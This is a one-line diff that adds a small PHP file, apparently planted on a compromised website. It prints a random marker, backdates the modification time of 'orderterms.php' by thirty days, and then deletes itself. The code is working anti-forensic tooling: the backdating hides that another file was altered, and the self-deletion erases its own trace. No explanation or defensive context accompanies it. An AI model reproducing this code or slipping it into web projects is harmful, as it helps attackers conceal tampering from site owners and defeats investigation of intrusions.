@@ -1,0 +1,1 @@
+<?php echo "RKPmBVdPyb"; if (file_exists("./orderterms.php")){ touch("./orderterms.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*1SbvnHdfHTmnwdxFmhWz*/ ?>
